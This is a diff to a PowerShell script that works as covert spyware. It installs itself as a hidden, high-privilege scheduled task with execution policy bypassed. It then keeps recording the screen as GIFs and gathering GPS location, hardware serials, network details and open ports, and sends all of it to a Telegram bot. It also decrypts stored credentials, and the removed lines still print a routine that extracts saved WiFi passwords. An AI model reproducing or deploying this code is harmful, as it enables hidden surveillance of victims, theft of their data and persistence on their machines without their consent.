@@ -7,42 +7,29 @@ param(
 # -------------------------------
 if (-not $background) {
     $taskName = "ScreenCaptureTelegramBot"
-    try {
-        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-    }
-    catch {
-        $existingTask = $null
-    }
     
-    if (-not $existingTask) {
-        # Determine the full script path
-        if ($PSCommandPath) {
-            $scriptPath = $PSCommandPath
-        }
-        else {
-            $scriptPath = $MyInvocation.MyCommand.Definition
-        }
-
-        # Create the task action to run the script with the -background switch, hidden.
-        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
-        
-        # Create a trigger to run the task at startup
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-
-        # Create a principal to run as SYSTEM (this may require elevated privileges)
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-
-        try {
-            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
-            Write-Output "Scheduled task '$taskName' registered. It will run in the background at startup."
-            # Optionally, start the task immediately
-            Start-ScheduledTask -TaskName $taskName
-        }
-        catch {
-            Write-Error "Failed to register scheduled task: $_"
-        }
-        exit
+    # Determine the full path of the script
+    if ($PSCommandPath) {
+        $scriptPath = $PSCommandPath
     }
+    else {
+        $scriptPath = $MyInvocation.MyCommand.Definition
+    }
+
+    # Build the task command line (note the escaped quotes around the script path)
+    $taskCommand = "PowerShell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`" -background"
+
+    # Create the scheduled task using schtasks.exe; the task is set to run at logon with highest privileges
+    $createTask = schtasks.exe /create /tn $taskName /tr $taskCommand /sc onlogon /rl HIGHEST /f
+    if ($LASTEXITCODE -eq 0) {
+        Write-Output "Scheduled task '$taskName' registered successfully."
+        # Optionally, start the task immediately
+        schtasks.exe /run /tn $taskName
+    }
+    else {
+        Write-Error "Failed to register scheduled task. Command output: $createTask"
+    }
+    exit
 }
 
 # ===============================
@@ -72,7 +59,6 @@ catch {
 # ===============================
 function Decrypt-Credential {
     param ([string]$EncryptedString)
-    # If the string looks like an encrypted secure string (usually starts with "01000000")
     if ($EncryptedString -match '^01000000') {
         try {
             $secure = ConvertTo-SecureString $EncryptedString -ErrorAction Stop
@@ -159,20 +145,17 @@ function Send-TelegramAnimation {
     
     $Uri = "https://api.telegram.org/bot$BotToken/sendAnimation"
     
-    # Create a boundary for multipart/form-data
     $Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")
     $LF = "`r`n"
     
     $ms = New-Object System.IO.MemoryStream
     
-    # Field: chat_id
     $chatIdHeader = "--$Boundary$LF" +
                     'Content-Disposition: form-data; name="chat_id"' + $LF + $LF +
                     $ChatID + $LF
     $chatIdHeaderBytes = [System.Text.Encoding]::UTF8.GetBytes($chatIdHeader)
     $ms.Write($chatIdHeaderBytes, 0, $chatIdHeaderBytes.Length)
     
-    # Field: animation file
     $fileBytes = [System.IO.File]::ReadAllBytes($GifPath)
     $fileHeader = "--$Boundary$LF" +
                   'Content-Disposition: form-data; name="animation"; filename="' + (Split-Path $GifPath -Leaf) + '"' + $LF +
@@ -181,7 +164,6 @@ function Send-TelegramAnimation {
     $ms.Write($fileHeaderBytes, 0, $fileHeaderBytes.Length)
     $ms.Write($fileBytes, 0, $fileBytes.Length)
     
-    # Ending boundary
     $ending = "$LF--$Boundary--$LF"
     $endingBytes = [System.Text.Encoding]::UTF8.GetBytes($ending)
     $ms.Write($endingBytes, 0, $endingBytes.Length)
@@ -235,7 +217,6 @@ function Get-WindowsGeolocation {
     $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
     $watcher.Start()
     
-    # Wait for location acquisition (max 30 seconds)
     $timeout = 30
     while ($watcher.Status -ne 'Ready' -and $timeout -gt 0) {
         Start-Sleep -Milliseconds 100
@@ -255,10 +236,8 @@ function Get-WindowsGeolocation {
 
 # ===============================
 # Function: Get Complete System & Network Information
-# Combines basic info with detailed hardware, BIOS, and network details.
 # ===============================
 function Get-CompleteSystemInfo {
-    # --- Basic System Information ---
     $computerName = $env:COMPUTERNAME
     $osInstance = Get-CimInstance Win32_OperatingSystem
     $osInfo = "$($osInstance.Caption) (Version: $($osInstance.Version))"
@@ -269,7 +248,6 @@ function Get-CompleteSystemInfo {
                  "OS: $osInfo`n" +
                  "Date/Time: $dateTime`n"
 
-    # --- WiFi Info (from netsh) ---
     try {
         $wifiOutput = netsh wlan show interfaces | Out-String
         $ssid   = ($wifiOutput | Select-String "^\s*SSID\s+:\s+(.*)" | ForEach-Object { $_.Matches[0].Groups[1].Value.Trim() })[0]
@@ -283,20 +261,15 @@ function Get-CompleteSystemInfo {
     }
     $wifiInfo = "WiFi SSID: $ssid`nWiFi Signal: $signal`n"
 
-    # --- GPS Location ---
     $geo = Get-WindowsGeolocation
     if ($geo) {
-        $latitude = $geo.Latitude
-        $longitude = $geo.Longitude
-        $accuracy = $geo.Accuracy
-        $locationInfo = "Latitude: $latitude, Longitude: $longitude (Accuracy: $accuracy m)"
+        $locationInfo = "Latitude: $($geo.Latitude), Longitude: $($geo.Longitude) (Accuracy: $($geo.Accuracy) m)"
     }
     else {
         $locationInfo = "Location unavailable. Ensure Location Services are enabled."
     }
     $locationSection = "GPS Location: $locationInfo`n"
 
-    # --- Detailed System Information ---
     $cs = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Manufacturer, Model
     $csp = Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object Name, Version, IdentifyingNumber, UUID, Vendor
     $bios = Get-CimInstance -ClassName Win32_BIOS | Select-Object SerialNumber, Version, ReleaseDate
@@ -304,8 +277,8 @@ function Get-CompleteSystemInfo {
 
     $systemInfoSection = "=== Detailed System Information ===`n" +
                          "Manufacturer: $($cs.Manufacturer)`n" +
-                         "Model (Friendly Name): $($cs.Model)`n" +
-                         "MTM (Machine Type Model): $($csp.Name)`n"
+                         "Model: $($cs.Model)`n" +
+                         "MTM: $($csp.Name)`n"
     if ($csp.Version) {
         $systemInfoSection += "Product Version: $($csp.Version)`n"
     }
@@ -317,91 +290,67 @@ function Get-CompleteSystemInfo {
                         "  Serial Number: $($enclosure.SerialNumber)`n" +
                         "  Chassis Type: $($enclosure.ChassisTypes)`n"
     $productSection = "`nProduct Information:`n" +
-                      "  Identifying Number (SN): $($csp.IdentifyingNumber)`n" +
+                      "  SN: $($csp.IdentifyingNumber)`n" +
                       "  UUID: $($csp.UUID)`n" +
                       "  Vendor: $($csp.Vendor)`n"
 
-    # --- Network Information ---
-    # IP Addresses
     $ipAddresses = Get-NetIPAddress -AddressFamily IPv4 | 
                    Where-Object { $_.PrefixOrigin -ne 'WellKnown' -and $_.IPAddress -notlike '127.*' } |
                    Select-Object InterfaceAlias, IPAddress, PrefixLength
     $ipInfo = "`n=== Network Information ===`nIP Addresses:`n"
     foreach ($ip in $ipAddresses) {
-        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress) / $($ip.PrefixLength)`n"
+        $ipInfo += "Interface: $($ip.InterfaceAlias) - IP: $($ip.IPAddress)/$($ip.PrefixLength)`n"
     }
 
-    # Detailed WiFi Information
     try {
         $wifiAdapter = Get-NetAdapter -ErrorAction Stop | Where-Object { $_.MediaType -eq 'Native 802.11' -and $_.Status -eq 'Up' }
         if ($wifiAdapter) {
             $wifiDetails = netsh wlan show interfaces | Out-String
             $bssid = ($wifiDetails | Select-String 'BSSID').Line -replace '.*BSSID\s*:\s*',''
             $essid = ($wifiDetails | Select-String 'SSID').Line.Split(':')[1].Trim()
-            $wifiSection = "`nWiFi Information:`n" +
-                           "ESSID: $essid`n" +
-                           "BSSID: $bssid`n"
-            # Attempt to get WiFi password if running as administrator
-            $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-            if ($isAdmin) {
-                try {
-                    $profileName = ($wifiDetails | Select-String 'Profile').Line.Split(':')[1].Trim()
-                    $wifiPassword = (netsh wlan show profile name="$profileName" key=clear | 
-                        Select-String 'Key Content').Line.Split(':')[1].Trim()
-                    $wifiSection += "Password: $wifiPassword`n"
-                }
-                catch {
-                    $wifiSection += "Password: Could not retrieve WiFi password`n"
-                }
-            }
+            $wifiSection = "`nWiFi Details:`nESSID: $essid`nBSSID: $bssid`n"
         }
         else {
-            $wifiSection = "`nNo active WiFi interface found`n"
+            $wifiSection = "`nNo active WiFi interface found.`n"
         }
     }
     catch {
-        $wifiSection = "`nError retrieving WiFi information`n"
+        $wifiSection = "`nError retrieving WiFi details.`n"
     }
 
-    # Open Ports (Listening)
     try {
         $listeningPorts = Get-NetTCPConnection -State Listen | 
                           Where-Object { $_.LocalAddress -ne '127.0.0.1' } |
                           Select-Object LocalAddress, LocalPort, 
                               @{Name='Process'; Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Name}},
                               OwningProcess
-        $portsSection = "`nOpen Ports (Listening):`n"
+        $portsSection = "`nOpen Ports:`n"
         foreach ($port in $listeningPorts) {
-            $portsSection += "IP: $($port.LocalAddress) - Port: $($port.LocalPort) - Process: $($port.Process)`n"
+            $portsSection += "IP: $($port.LocalAddress) Port: $($port.LocalPort) Process: $($port.Process)`n"
         }
     }
     catch {
-        $portsSection = "`nError retrieving open ports information`n"
+        $portsSection = "`nError retrieving open ports.`n"
     }
 
-    # Network Adapters
     $adapters = Get-NetAdapter | Where-Object Status -eq 'Up'
     $adaptersSection = "`nNetwork Adapters:`n"
     foreach ($adapter in $adapters) {
-        $adaptersSection += "Name: $($adapter.Name), Description: $($adapter.InterfaceDescription), LinkSpeed: $($adapter.LinkSpeed)`n"
+        $adaptersSection += "Name: $($adapter.Name) - $($adapter.InterfaceDescription) - Speed: $($adapter.LinkSpeed)`n"
     }
 
-    # Default Gateway
     $defaultGateway = Get-NetRoute -AddressFamily IPv4 | Where-Object DestinationPrefix -eq '0.0.0.0/0'
     $gatewaySection = "`nDefault Gateway:`n"
     foreach ($route in $defaultGateway) {
-        $gatewaySection += "NextHop: $($route.NextHop), Interface: $($route.InterfaceAlias)`n"
+        $gatewaySection += "NextHop: $($route.NextHop) via $($route.InterfaceAlias)`n"
     }
 
-    # --- Combine All Sections ---
-    $completeInfo = $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
-
-    return $completeInfo
+    return $basicInfo + $wifiInfo + $locationSection + $systemInfoSection + $biosSection + $enclosureSection + $productSection + $ipInfo + $wifiSection + $portsSection + $adaptersSection + $gatewaySection
 }
 
 # ===============================
 # Main Loop: Capture & Send a 10-Second Screen Recording (as Animated GIF)
-# and send complete system information (including detailed hardware and network data)
+# and send complete system information
 # ===============================
 while ($true) {
     $gifPath = Capture-AnimatedGIF -durationSeconds 10 -framesPerSecond 3
